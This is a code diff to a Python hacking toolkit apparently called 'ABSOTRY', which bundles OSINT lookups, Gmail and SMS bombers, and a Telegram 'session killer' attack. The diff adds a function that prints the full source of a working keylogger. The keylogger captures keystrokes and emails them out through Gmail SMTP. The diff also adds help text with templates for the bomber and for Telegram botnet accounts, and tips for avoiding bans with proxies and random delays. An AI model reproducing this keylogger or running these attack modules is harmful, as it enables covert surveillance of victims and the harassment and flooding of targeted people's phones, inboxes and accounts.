@@ -40,14 +40,24 @@ import configparser
 from urllib.parse import urlparse
 import socket
 import socks
+import PyInstaller.__main__
 
 
 
 init()
-# CLEAR CONSOLE
-def clear_console():
-  os.system('cls')
 
+
+
+
+def clear_console():
+    if os.name == 'nt':
+        if 'TERM' in os.environ or 'SHELL' in os.environ:
+            os.system('clear')
+        else:
+            os.system('cls')  
+    else:
+        os.system('clear')
+    
 
 # USER-AGENT
 
@@ -56,9 +66,9 @@ headers = {'user-agent': user}
 
 # Функция для цветных заголовков
 def print_service_header(service_name):
-    print(f"\n{Fore.YELLOW}{'=' * 50}")
-    print(f"{Fore.CYAN}{pyfiglet.figlet_format(service_name, font='small')}")
-    print(f"{Fore.YELLOW}{'=' * 50}{Style.RESET_ALL}")
+    print(f"\n{Fore.WHITE}{'=' * 50}")
+    print(f"{Fore.WHITE}{pyfiglet.figlet_format(service_name, font='small')}")
+    print(f"{Fore.WHITE}{'=' * 50}{Style.RESET_ALL}")
 
 #PROXY
 
@@ -1450,6 +1460,90 @@ def check_host(ipby56, proxy_dict):
 
 ################################################################################################
 
+# Key-Logger
+
+################################################################################################
+
+def key_logger():
+    getcode = '''
+
+
+from pynput.keyboard import Key, Listener
+import smtplib
+import logging
+
+word = ''
+full_log = ''
+chars_limit = 1000
+while True:
+
+    def keylogger(key):
+        global word
+        global full_log
+        
+        try:
+            if key == Key.space:
+                word += ' '
+            elif key == Key.enter:
+                word += '\n'
+            elif key == Key.backspace:
+                word = word[:-1]
+            elif key in (Key.shift, Key.shift_l, Key.shift_r, Key.ctrl, Key.alt, Key.cmd):
+                return
+            else:
+                # Правильное извлечение символа
+                if hasattr(key, 'char'):
+                    word += key.char
+                else:
+                    # Для специальных клавиш добавляем их название
+                    word += f'[{key.name}]'
+                    
+            # Проверка на достижение лимита
+            if len(full_log + word) >= chars_limit:
+                full_log += word
+                send_email()
+                full_log = ''
+                word = ''
+                
+        except Exception as e:
+            logging.error(f"Key error: {e}")
+
+    def send_email():
+        sender = 'YOUR_EMAIL@gmail.com'
+        receiver = 'EMAIL TO SEND@gmail.com'
+        password = 'YOUR_APP_PASSWORD'
+        
+        try:
+            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:  
+                server.login(sender, password)
+                subject = "Keylogger Report"
+                body = f"Logged text:\n\n{full_log}"
+                message = f"Subject: {subject}\n\n{body}"
+                server.sendmail(sender, receiver, message)
+                print("Email sent successfully!")
+        except Exception as e:
+            logging.error(f"Email failed: {e}")
+
+    def main():
+        with Listener(on_press=keylogger) as log:
+            log.join()
+
+    if __name__ == '__main__':
+        main()
+
+
+
+
+
+
+'''
+
+    print(getcode)
+
+
+
+################################################################################################
+
 #BOMBERS
 
 ################################################################################################
@@ -1687,20 +1781,31 @@ def run_async_task(async_func, *args):
 
 
 def main():
-    absotry = pyfiglet.figlet_format("ABSOTRY")
-    print(Fore.MAGENTA + absotry)
+    logo = """
+ ▄▄▄       ▄▄▄▄     ██████  ▒█████  ▄▄▄█████▓ ██▀███  ▓██   ██▓
+▒████▄    ▓█████▄ ▒██    ▒ ▒██▒  ██▒▓  ██▒ ▓▒▓██ ▒ ██▒ ▒██  ██▒
+▒██  ▀█▄  ▒██▒ ▄██░ ▓██▄   ▒██░  ██▒▒ ▓██░ ▒░▓██ ░▄█ ▒  ▒██ ██░
+░██▄▄▄▄██ ▒██░█▀    ▒   ██▒▒██   ██░░ ▓██▓ ░ ▒██▀▀█▄    ░ ▐██▓░
+ ▓█   ▓██▒░▓█  ▀█▓▒██████▒▒░ ████▓▒░  ▒██▒ ░ ░██▓ ▒██▒  ░ ██▒▓░
+ ▒▒   ▓▒█░░▒▓███▀▒▒ ▒▓▒ ▒ ░░ ▒░▒░▒░   ▒ ░░   ░ ▒▓ ░▒▓░   ██▒▒▒ 
+  ▒   ▒▒ ░▒░▒   ░ ░ ░▒  ░ ░  ░ ▒ ▒░     ░      ░▒ ░ ▒░ ▓██ ░▒░ 
+  ░   ▒    ░    ░ ░  ░  ░  ░ ░ ░ ▒    ░        ░░   ░  ▒ ▒ ░░  
+      ░  ░ ░            ░      ░ ░              ░      ░ ░     
+                ░                                      ░ ░     
+    """
+    print(Fore.WHITE + logo)
     print(Fore.WHITE + "\nhttps://github.com/absotry/56\n")
     
-    if input(Fore.WHITE + "TYPE 56 TO CONTINUE\n\n\n\n>:     ") != "56":
+    if input(Fore.WHITE + "TYPE 56 TO CONTINUE\n> ") != "56":
         return
     clear_console()
     
-    # Настройки по умолчанию
+    # Default settings
     proxies56 = None
     vkTOKEN = None
     VKvers = "5.199"
     TGnumber = None
-    tg_accounts_file = "tg_accounts.ini"  # Файл с аккаунтами по умолчанию
+    tg_accounts_file = "tg_accounts.ini"
     youtube_api_key = None
     faceitapi = None
     getcontactapi = None
@@ -1718,57 +1823,70 @@ def main():
     BOMBER_CONFIG = None
     TrueCallerAPI = None
     
-    # Параметры атаки Telegram
+    # Telegram attack parameters
     MAX_ATTEMPTS = 5
     DELAY_RANGE = (5, 10)
     THREADS_COUNT = 8
 
-    # Создаем папку для сессий
+    # Create sessions directory
     os.makedirs("sessions", exist_ok=True)
 
     while True:
-        time.sleep(0.5)
-        print(Fore.MAGENTA + absotry)
+        time.sleep(0.3)
+        print(Fore.WHITE + logo)
 
         choice = input(Fore.WHITE + 
-            "\nOptions:\n\n"
-            "1. OSINT\n"
-            "2. Set API\n"
-            "3. Set proxy\n"
-            "4. Bomber\n"
-            "5. Telegram\n"
-            "6. Exit\n"
-            "\n\n>:     "
+            "\n" + "="*50 + 
+            "\nMAIN MENU\n" +
+            "="*50 +
+            "\n1. OSINT Tools\n" +
+            "2. API Configuration\n" +
+            "3. Proxy Setup\n" +
+            "4. Bomber Module\n" +
+            "5. Telegram Operations\n" +
+            "6. Helps\n" +
+            "7. Exit Program\n" +
+            "="*50 +
+            "\nEnter choice: "
         )
 
         if choice == "1":
             clear_console()
-            print(Fore.MAGENTA + absotry)
-            osint56 = input(Fore.WHITE + "\nChoose:\n1. Username\n2. Phone\n3. Email\n4. ip\n>:     ")
+            print(Fore.WHITE + logo)
+            osint56 = input(Fore.WHITE + 
+                "\n" + "-"*50 +
+                "\nOSINT TOOLS\n" +
+                "-"*50 +
+                "\n1. Username Search\n" +
+                "2. Phone Number Lookup\n" +
+                "3. Email Investigation\n" +
+                "4. IP Analysis\n" +
+                "-"*50 +
+                "\nSelect option: "
+            )
             if osint56 == "1":
                 clear_console()
-                print(Fore.MAGENTA + absotry)
-
-                username = input(Fore.WHITE + "\nEnter username:\n>:     ").strip()
+                print(Fore.WHITE + logo)
+                username = input(Fore.WHITE + "\nEnter username: ").strip()
                 if not username:
                     clear_console()
-                    print(Fore.MAGENTA + absotry)
-                    print(f"{Fore.RED}\nUsername cannot be empty")
+                    print(Fore.WHITE + logo)
+                    print(f"{Fore.RED}\nERROR: Username cannot be empty")
                     continue
                     
                 proxy_dict = None
                 if get_random_proxy():
-                    print(f"{Fore.YELLOW}\n{'='*50}")
-                    print(f"{Fore.CYAN}PROXY CHECK")
-                    print(f"{Fore.YELLOW}{'='*50}{Style.RESET_ALL}")
+                    print(f"{Fore.CYAN}\n{'-'*50}")
+                    print(f"PROXY VERIFICATION")
+                    print(f"{'-'*50}{Style.RESET_ALL}")
                     proxy_dict = get_location(url='https://2ip.ru', proxy_str=get_random_proxy())
                 else:
-                    print("Proxy error")
+                    print(f"{Fore.RED}Proxy configuration error")
                 
                 if vkTOKEN:
                     VK_search(username, vkTOKEN, VKvers, proxy_dict)
                 else:
-                    print(f"{Fore.YELLOW}VK token not set. Skipping VK search.")
+                    print(f"{Fore.YELLOW}VK token not configured. Skipping VK search.")
 
                 search_220vk(username, proxy_dict)
                 search_tiktok(username, proxy_dict)
@@ -1782,62 +1900,53 @@ def main():
                 search_reddit(username, proxy_dict)
                 ipeekyou(username, proxy_dict)
             
-            if osint56 == "2":
+            elif osint56 == "2":
                 clear_console()
-                print(Fore.MAGENTA + absotry)
-                number = input(Fore.WHITE + "\nEnter number\n>:     ")
+                print(Fore.WHITE + logo)
+                number = input(Fore.WHITE + "\nEnter phone number: ")
                 proxy_dict = None
                 if get_random_proxy():
-                    print(f"{Fore.YELLOW}\n{'='*50}")
-                    print(f"{Fore.CYAN}PROXY CHECK")
-                    print(f"{Fore.YELLOW}{'='*50}{Style.RESET_ALL}")
+                    print(f"{Fore.CYAN}\n{'-'*50}")
+                    print(f"PROXY VERIFICATION")
+                    print(f"{'-'*50}{Style.RESET_ALL}")
                     proxy_dict = get_location(url='https://2ip.ru', proxy_str=get_random_proxy())
-
-            
                 else:
                     clear_console()
-                    print(Fore.MAGENTA + absotry)
-                    print("\nProxy error")
-
+                    print(Fore.WHITE + logo)
+                    print(f"{Fore.RED}\nProxy configuration error")
 
                 search_numverify(number, NumVerifyAPI, proxy_dict)
                 phonenumbers_search(number)
                 truecaller_search(number, TrueCallerAPI, proxy_dict)
 
-            if osint56 =="3":
+            elif osint56 =="3":
                 clear_console()
-                print(Fore.MAGENTA + absotry)
-                email = input(Fore.WHITE + "\nComing soon\n>:     ")
+                print(Fore.WHITE + logo)
+                email = input(Fore.WHITE + "\nFeature in development\nEnter email: ")
                 if get_random_proxy():
-                    print(f"{Fore.YELLOW}\n{'='*50}")
-                    print(f"{Fore.CYAN}PROXY CHECK")
-                    print(f"{Fore.YELLOW}{'='*50}{Style.RESET_ALL}")
+                    print(f"{Fore.CYAN}\n{'-'*50}")
+                    print(f"PROXY VERIFICATION")
+                    print(f"{'-'*50}{Style.RESET_ALL}")
                     proxy_dict = get_location(url='https://2ip.ru', proxy_str=get_random_proxy())
-
-            
                 else:
                     clear_console()
-                    print(Fore.MAGENTA + absotry)
-                    print("\nProxy error")
+                    print(Fore.WHITE + logo)
+                    print(f"{Fore.RED}\nProxy configuration error")
 
-
-
-            if osint56 =="4":
+            elif osint56 =="4":
                 clear_console()
-                print(Fore.MAGENTA + absotry)
-                ipby56 = input("ip:\n>:     ")
+                print(Fore.WHITE + logo)
+                ipby56 = input(Fore.WHITE + "\nEnter IP address: ")
                 proxy_dict = None
                 if get_random_proxy():
-                    print(f"{Fore.YELLOW}\n{'='*50}")
-                    print(f"{Fore.CYAN}PROXY CHECK")
-                    print(f"{Fore.YELLOW}{'='*50}{Style.RESET_ALL}")
+                    print(f"{Fore.CYAN}\n{'-'*50}")
+                    print(f"PROXY VERIFICATION")
+                    print(f"{'-'*50}{Style.RESET_ALL}")
                     proxy_dict = get_location(url='https://2ip.ru', proxy_str=get_random_proxy())
-
-            
                 else:
                     clear_console()
-                    print(Fore.MAGENTA + absotry)
-                    print("Proxy error")
+                    print(Fore.WHITE + logo)
+                    print(f"{Fore.RED}Proxy configuration error")
                 ip_search(ipby56, proxy_dict)
                 iknowwd(ipby56, proxy_dict)
                 spys(ipby56, proxy_dict)
@@ -1846,179 +1955,222 @@ def main():
 
         elif choice == "2":
             clear_console()
-            print(Fore.MAGENTA + absotry)
-            APIchoose = input(Fore.WHITE + "Choose:\n1.VK\n2.Telegram\n3.YouTube\n4. FACEIT\n5. GetContact\n6.Numverify\n7.TrueCaller\n>:     ")
+            print(Fore.WHITE + logo)
+            APIchoose = input(Fore.WHITE + 
+                "\n" + "-"*50 +
+                "\nAPI CONFIGURATION\n" +
+                "-"*50 +
+                "\n1. VK API\n" +
+                "2. Telegram API\n" +
+                "3. YouTube API\n" +
+                "4. FACEIT API\n" +
+                "5. GetContact API\n" +
+                "6. Numverify API\n" +
+                "7. TrueCaller API\n" +
+                "-"*50 +
+                "\nSelect API: "
+            )
             if APIchoose == "1":
                 clear_console()
-                print(Fore.MAGENTA + absotry)
-                vkTOKEN = input(Fore.WHITE  + "Enter VK API token:\n>: ").strip()
-                print(f"{Fore.GREEN}VK token set successfully!")
+                print(Fore.WHITE + logo)
+                vkTOKEN = input(Fore.WHITE  + "\nEnter VK API token: ").strip()
+                print(f"{Fore.GREEN}\nSUCCESS: VK token configured")
             elif APIchoose == "2":
-                clear_console
-                print(Fore.MAGENTA + absotry)
-                tgapivibor = input(Fore.WHITE  + "Choose:\n1.TG API APP\n2.TG API HASH\n3.Number\n4.Skip\n>:     ")
+                clear_console()
+                print(Fore.WHITE + logo)
+                tgapivibor = input(Fore.WHITE  + 
+                    "\n" + "-"*50 +
+                    "\nTELEGRAM CONFIGURATION\n" +
+                    "-"*50 +
+                    "\n1. API ID\n" +
+                    "2. API HASH\n" +
+                    "3. Phone Number\n" +
+                    "4. Back to API Menu\n" +
+                    "-"*50 +
+                    "\nSelect option: "
+                )
                 if tgapivibor == "1":
                     clear_console()
-                    print(Fore.MAGENTA + absotry)
-                    tg_apiapp = input(Fore.WHITE  + "Enter Telegram API APP:\n>:     ")
+                    print(Fore.WHITE + logo)
+                    tg_apiapp = input(Fore.WHITE  + "\nEnter Telegram API ID: ")
                 elif tgapivibor == "2":
                     clear_console()
-                    print(Fore.MAGENTA + absotry)
-                    tg_apihash = input(Fore.WHITE  + "Enter Telegram API HASH:\n>:     ")
+                    print(Fore.WHITE + logo)
+                    tg_apihash = input(Fore.WHITE  + "\nEnter Telegram API HASH: ")
                 elif tgapivibor == "3":
                     clear_console()
-                    print(Fore.MAGENTA + absotry)
-                    TGnumber = input(Fore.WHITE  + "Enter Telegram number:\n>:     ")
+                    print(Fore.WHITE + logo)
+                    TGnumber = input(Fore.WHITE  + "\nEnter Telegram phone number: ")
                 else:
                     clear_console()
-                    print(Fore.MAGENTA + absotry)
-                    print(f"{Fore.YELLOW}Skipping Telegram API setup")
+                    print(Fore.WHITE + logo)
+                    print(f"{Fore.YELLOW}\nReturning to API menu")
             elif APIchoose == "3":
-                clear_console
-                print(Fore.MAGENTA + absotry)
-                youtube_api_key = input(Fore.WHITE  + "Enter YouTube API key:\n>:     ").strip()
-                print(f"{Fore.GREEN}YouTube API key set successfully!")
+                clear_console()
+                print(Fore.WHITE + logo)
+                youtube_api_key = input(Fore.WHITE  + "\nEnter YouTube API key: ").strip()
+                print(f"{Fore.GREEN}\nSUCCESS: YouTube API configured")
             elif APIchoose == "4":
                 clear_console()
-                print(Fore.MAGENTA + absotry)
-                faceitapi = input(Fore.WHITE + " Faceit api\n>:     ")
-                print(f"{Fore.GREEN}Faceit API key set successfully!")
+                print(Fore.WHITE + logo)
+                faceitapi = input(Fore.WHITE + "\nEnter FACEIT API key: ")
+                print(f"{Fore.GREEN}\nSUCCESS: FACEIT API configured")
             elif APIchoose == "5":
                 clear_console()
-                print(Fore.MAGENTA + absotry)
-                getcontactapi = input(Fore.WHITE + "getcontact api\n>:     ")
-                print(Fore.GREEN + "Getcontact API key set successfully!")
+                print(Fore.WHITE + logo)
+                getcontactapi = input(Fore.WHITE + "\nEnter GetContact API key: ")
+                print(f"{Fore.GREEN}\nSUCCESS: GetContact API configured")
             elif APIchoose == "6":
                 clear_console()
-                print(Fore.MAGENTA + absotry)
-                NumVerifyAPI = input(Fore.WHITE + "numverify api\n>:     ")
-                print(Fore.GREEN + "numverify API key set successfully!")
+                print(Fore.WHITE + logo)
+                NumVerifyAPI = input(Fore.WHITE + "\nEnter Numverify API key: ")
+                print(f"{Fore.GREEN}\nSUCCESS: Numverify API configured")
             elif APIchoose == '7':
                 clear_console()
-                print(Fore.MAGENTA + absotry)
-                TrueCallerAPI = input(Fore.WHITE  + '\nTrueCaller API:\n>:     ')
+                print(Fore.WHITE + logo)
+                TrueCallerAPI = input(Fore.WHITE  + '\nEnter TrueCaller API key: ')
+                print(f"{Fore.GREEN}\nSUCCESS: TrueCaller API configured")
             else:
                 clear_console()
-                print(Fore.MAGENTA + absotry)
-                print(f"{Fore.RED}Invalid choice")
+                print(Fore.WHITE + logo)
+                print(f"{Fore.RED}\nERROR: Invalid selection")
                 
 
-        elif choice == "3":  # Прокси
+        elif choice == "3":
             clear_console()
-            print(Fore.MAGENTA + absotry)
-            proxy_file = input("Path to proxy config file:\n>:     ")
-            PROXIES_LOADED = load_proxies(proxy_file)
+            print(Fore.WHITE + logo)
+            proxy_file = input(Fore.WHITE + "\nEnter path to proxy configuration file: ")
+            if load_proxies(proxy_file):
+                print(f"{Fore.GREEN}\nSUCCESS: Proxies loaded")
+                PROXIES_LOADED = True
+            else:
+                print(f"{Fore.RED}\nERROR: Failed to load proxies")
         
 
         elif choice == "4":
             clear_console()
-            print(Fore.MAGENTA + absotry)
-            bomber_type = input(Fore.WHITE + "\nChoose:\n1. Gmail\n2. Number\n>:     ")
+            print(Fore.WHITE + logo)
+            bomber_type = input(Fore.WHITE + 
+                "\n" + "-"*50 +
+                "\nBOMBER MODULE\n" +
+                "-"*50 +
+                "\n1. Gmail Bomber\n" +
+                "2. SMS Bomber\n" +
+                "-"*50 +
+                "\nSelect option: "
+            )
             
-            if bomber_type == "1":  # Gmail из INI-конфига
+            if bomber_type == "1":
                 clear_console()
-                print(Fore.MAGENTA + absotry)
-                config_file = input("\nConfig INI file path:\n>:     ")
-                BOMBER_CONFIG = load_bomber_config(config_file)  # Используем новую функцию
+                print(Fore.WHITE + logo)
+                config_file = input(Fore.WHITE + "\nEnter path to bomber configuration file: ")
+                BOMBER_CONFIG = load_bomber_config(config_file)
                 
                 if BOMBER_CONFIG:
+                    print(f"{Fore.CYAN}\nStarting Gmail bomber...")
                     start_gmail_bomber(BOMBER_CONFIG)
+                else:
+                    print(f"{Fore.RED}\nERROR: Invalid bomber configuration")
 
-
-            if bomber_type == "2":
+            elif bomber_type == "2":
                 clear_console()
-                print(Fore.MAGENTA + absotry)
-                chooser = input("\nChoose:\n1.Target number phone\n2. Start sms bomber\n>:     ")
+                print(Fore.WHITE + logo)
+                chooser = input(Fore.WHITE + 
+                    "\n" + "-"*50 +
+                    "\nSMS BOMBER\n" +
+                    "-"*50 +
+                    "\n1. Set Target Number\n" +
+                    "2. Start SMS Attack\n" +
+                    "-"*50 +
+                    "\nSelect option: "
+                )
                 if chooser == "1":
                     clear_console()
-                    print(Fore.MAGENTA + absotry)
-                    phoneby56 = input("\nTarget number of phone:\n>:"     )
-                else:
-                    print("")
-                if chooser == "2":
-                    clear_console()
-                    print(Fore.MAGENTA + absotry)
-                    smsbomber(phoneby56)
-                else:
-                    None
-            else:
-                None
+                    print(Fore.WHITE + logo)
+                    phoneby56 = input(Fore.WHITE + "\nEnter target phone number: ")
+                    print(f"{Fore.GREEN}\nTarget number set")
+                elif chooser == "2":
+                    if not phoneby56:
+                        print(f"{Fore.RED}\nERROR: No target number configured")
+                    else:
+                        print(f"{Fore.CYAN}\nInitiating SMS bombardment...")
+                        smsbomber(phoneby56)
             
 
         elif choice == "5":
             clear_console()
-            print(Fore.MAGENTA + absotry)
+            print(Fore.WHITE + logo)
             telegramvibor = input(Fore.WHITE + 
-                "Telegram Attack Menu:\n"
-                "1. Load Telegram Accounts\n"
-                "2. Set Target Phone Number\n"
-                "3. Set MAX ATTEMPTS (current: {})\n"
-                "4. Set DELAY RANGE (current: {}-{} sec)\n"
-                "5. Set THREADS COUNT (current: {})\n"
-                "6. Start session killer (Need +-25 accounts + proxy)\n"
-                "7. Back to Main Menu\n"
-                ">: ".format(
-                    MAX_ATTEMPTS, 
-                    DELAY_RANGE[0], 
-                    DELAY_RANGE[1], 
-                    THREADS_COUNT)
+                "\n" + "="*50 +
+                f"\nTELEGRAM OPERATIONS (Threads: {THREADS_COUNT}, Attempts: {MAX_ATTEMPTS})" +
+                "\n" + "="*50 +
+                "\n1. Load Telegram Accounts\n" +
+                "2. Set Target Phone Number\n" +
+                "3. Set Max Attempts\n" +
+                "4. Set Delay Range\n" +
+                "5. Set Thread Count\n" +
+                "6. Start Session Killer\n" +
+                "7. Back to Main Menu\n" +
+                "-"*50 +
+                "\nEnter choice: "
             )
             
             if telegramvibor == "1":
                 clear_console()
-                print(Fore.MAGENTA + absotry)
-                file_path = input("Path to accounts config (default: tg_accounts.ini):\n>: ") or "tg_accounts.ini"
-                if not load_telegram_accounts(file_path):
-                    if input("Create sample config? (y/n): ").lower() == "y":
+                print(Fore.WHITE + logo)
+                file_path = input(Fore.WHITE + "\nEnter path to accounts file: ") or "tg_accounts.ini"
+                if load_telegram_accounts(file_path):
+                    print(f"{Fore.GREEN}\nSUCCESS: Accounts loaded")
+                else:
+                    if input(f"{Fore.YELLOW}\nCreate sample config? (y/n): ").lower() == "y":
                         save_accounts_config(file_path)
+                        print(f"{Fore.GREEN}\nSample config created")
             elif telegramvibor == "2":
                 clear_console()
-                print(Fore.MAGENTA + absotry)
-                TGnumber = input("Target Phone Number (+XXXXXXXXXXX):\n>: ")
-                print(f"{Fore.GREEN}Target number set!{Style.RESET_ALL}")
+                print(Fore.WHITE + logo)
+                TGnumber = input(Fore.WHITE + "\nEnter target phone number (+XX...): ")
+                print(f"{Fore.GREEN}\nTarget number set")
             elif telegramvibor == "3":
                 clear_console()
-                print(Fore.MAGENTA + absotry)
+                print(Fore.WHITE + logo)
                 try:
-                    MAX_ATTEMPTS = int(input("Enter MAX ATTEMPTS (per thread):\n>: "))
-                    print(f"{Fore.GREEN}MAX ATTEMPTS set to {MAX_ATTEMPTS}{Style.RESET_ALL}")
+                    MAX_ATTEMPTS = int(input("\nEnter max attempts per thread: "))
+                    print(f"{Fore.GREEN}\nMax attempts set to {MAX_ATTEMPTS}")
                 except ValueError:
-                    print(f"{Fore.RED}Invalid input! Must be a number.{Style.RESET_ALL}")
+                    print(f"{Fore.RED}\nERROR: Invalid number format")
             elif telegramvibor == "4":
                 clear_console()
-                print(Fore.MAGENTA + absotry)
+                print(Fore.WHITE + logo)
                 try:
-                    min_delay = float(input("Enter MIN DELAY (seconds):\n>: "))
-                    max_delay = float(input("Enter MAX DELAY (seconds):\n>: "))
+                    min_delay = float(input("\nEnter minimum delay (seconds): "))
+                    max_delay = float(input("Enter maximum delay (seconds): "))
                     if min_delay < 1 or max_delay < min_delay:
                         raise ValueError
                     DELAY_RANGE = (min_delay, max_delay)
-                    print(f"{Fore.GREEN}DELAY RANGE set to {min_delay}-{max_delay} seconds{Style.RESET_ALL}")
+                    print(f"{Fore.GREEN}\nDelay range set to {min_delay}-{max_delay} seconds")
                 except ValueError:
-                    print(f"{Fore.RED}Invalid input!{Style.RESET_ALL}")
+                    print(f"{Fore.RED}\nERROR: Invalid delay values")
             elif telegramvibor == "5":
                 clear_console()
-                print(Fore.MAGENTA + absotry)
+                print(Fore.WHITE + logo)
                 try:
-                    THREADS_COUNT = int(input("Enter THREADS COUNT:\n>: "))
+                    THREADS_COUNT = int(input("\nEnter thread count (1-200): "))
                     if THREADS_COUNT < 1 or THREADS_COUNT > 200:
                         raise ValueError
-                    print(f"{Fore.GREEN}THREADS COUNT set to {THREADS_COUNT}{Style.RESET_ALL}")
+                    print(f"{Fore.GREEN}\nThread count set to {THREADS_COUNT}")
                 except ValueError:
-                    print(f"{Fore.RED}Invalid input! Must be between 1-200.{Style.RESET_ALL}")
+                    print(f"{Fore.RED}\nERROR: Invalid thread count")
             elif telegramvibor == "6":
                 clear_console()
-                print(Fore.MAGENTA + absotry)
+                print(Fore.WHITE + logo)
                 if not TELEGRAM_ACCOUNTS:
-                    print(f"{Fore.RED}Error: No Telegram accounts loaded!{Style.RESET_ALL}")
+                    print(f"{Fore.RED}\nERROR: No Telegram accounts loaded")
                     continue
                 if not TGnumber:
-                    clear_console()
-                    print(Fore.MAGENTA + absotry)
-                    print(f"{Fore.RED}Error: Target phone number not set!{Style.RESET_ALL}")
+                    print(f"{Fore.RED}\nERROR: Target number not configured")
                     continue
                     
-                # Session killer
+                print(f"{Fore.CYAN}\nStarting session killer attack...")
                 attack_threads = start_telegram_attack(
                     TGnumber,
                     THREADS_COUNT,
@@ -2026,27 +2178,153 @@ def main():
                     DELAY_RANGE
                 )
                 
-                # Ожидание завершения всех потоков
                 for t in attack_threads:
                     t.join()
-                clear_console()
-                print(Fore.MAGENTA + absotry)
-                print(f"{Fore.GREEN}\nAttack completed! All sessions terminated!{Style.RESET_ALL}")
+                    
+                print(f"{Fore.GREEN}\nATTACK COMPLETED: All sessions terminated")
             elif telegramvibor == "7":
                 continue
             else:
-                print(f"{Fore.RED}Invalid choice!{Style.RESET_ALL}")
-                
+                print(f"{Fore.RED}\nERROR: Invalid selection")
+
         elif choice == "6":
             clear_console()
-            print(Fore.MAGENTA + absotry)
-            print(f"{Fore.YELLOW}Exiting...{Style.RESET_ALL}")
+            print(Fore.WHITE + logo)
+            print("Contact with me\nTelegram: @absotry\nEmail: 5656@tutamail.com\n")
+            print("Version: 0.3")
+            helpme56 = input(
+                "\n============================\n"
+                "HELP MENU:\n" 
+                '============================\n'
+
+                "\n1. Help me with CFG\n" 
+                "2. For what i can get ban?\n\n"
+                '============================\n\n'
+
+
+                ">  "
+                )
+            if helpme56 == "1":
+                clear_console()
+                print(Fore.WHITE + logo)
+                CFGhelp = '''\n
+You need create CFG for
+
+1. GMAILBOMBER
+2. Proxy
+3. Telegram session killer
+
+you can change name file for all CFG
+
+Format for GmailBomber:
+File format file.ini
+
+CFG format:
+
+[Bomber]
+Subject = 56
+Message = 56
+AmountPerAccount = 3
+
+[Targets]
+target1 = 56@gmail.com, 565@gmail.com...
+
+[Account1]
+Email = 56project@gmail.com
+AppPassword = 5656 5656 5656 5656
+
+For AppPassword you need enable Double Auth.
+https://myaccount.google.com/apppasswords
+
+
+Format for Telegram:
+File format file.ini
+
+You need create app for telegram
+https://my.telegram.org/auth?to=apps
+
+CFG format:
+
+
+
+
+[TelegramAccount1]
+Name = @botnetuser
+API_ID = 56565656
+API_HASH = qwertyqwertyqwertyqwertyqwertyqwe
+
+[TelegramAccount2]
+Name = @botnet56
+API_ID = 56565650
+API_HASH = qwertyqwertyqwertyqwertyqwertyq56
+
+Proxies format
+file: file.ini
+
+CFG format
+
+[Proxy1]
+name = "USA"
+url = "socks4://31.42.185.134:1080"
+
+[Proxy2]
+name = "Europe HTTP"
+url = "http://45.67.215.68:80"
+
+[Proxy3]
+name = "Asia HTTPS"
+url = "http://45.8.211.33:80"
+
+[Proxy4]
+name = "USA"
+url = "http://185.221.160.2:80"
+
+
+In feature will added support with tor-bridge
+
+
+I SO RECOMMEND USE VPN, BECOUSE PROXY CONNECTION CAN FAILED
+
+'''
+                print(CFGhelp)
+                input("Type anothing to continue...\n>  ")
+                clear_console()
+
+            elif helpme56 == "2":
+                clear_console()
+                print(Fore.WHITE + logo)
+                HelpCanIgetBan = '''
+For what i  can het ban?
+
+1. For abuse parsing for your own ip (IP BAN)
+
+2. For abuse session killer without proxy and with identical delay.
+after +- 7 attempts accounts get spamm ban. First ban - 24hours (IPban, device ban, account ban)
+
+3. For abuse gmailbomber
+
+For get smaller chanse for ban
+
+1. Use VPN + ProxyCFG (56 auto take random proxy, but sometimes can be errors)
+
+2. Use random delay
+''' 
+                print(HelpCanIgetBan)
+                input("Type anothing...\n>  ")
+                clear_console()
+            else:
+                None
+                
+        elif choice == "7":
+            clear_console()
+            print(Fore.WHITE + logo)
+            print(f"{Fore.CYAN}\nExiting program...")
             break
 
         else:
             clear_console()
-            print(Fore.MAGENTA + absotry)
-            print(f"{Fore.RED}Invalid choice{Style.RESET_ALL}")
+            print(Fore.WHITE + logo)
+            print(f"{Fore.RED}\nERROR: Invalid menu selection")
 
 if __name__ == '__main__':
     main()
